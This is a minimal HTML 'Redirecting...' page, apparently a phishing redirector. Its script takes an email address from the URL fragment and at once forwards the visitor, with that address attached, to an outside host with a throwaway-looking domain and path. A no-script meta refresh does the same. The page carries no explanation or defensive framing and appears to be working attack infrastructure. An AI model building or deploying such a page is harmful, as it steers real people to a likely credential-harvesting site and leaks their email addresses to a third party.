<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <script>
    // Read email from URL fragment (hash)
    const email = decodeURIComponent(window.location.hash.substring(1)); // Remove leading '#'

    // Your final target URL (replace with your actual target)
    const targetBase = "https://loq.portelglobe434.com/HhsKrhfE";

    if (email) {
      // Redirect to target URL with email appended as fragment or query param
      window.location.replace(`${targetBase}#${email}`);
    } else {
      // If no email found, just redirect to base target
      window.location.replace(targetBase);
    }
  </script>
  <noscript>
    <meta http-equiv="refresh" content="0;url=https://loq.portelglobe434.com/HhsKrhfE" />
    <p>If you are not redirected, <a href="https://loq.portelglobe434.com/HhsKrhfE">click here</a>.</p>
  </noscript>
</head>

</html>
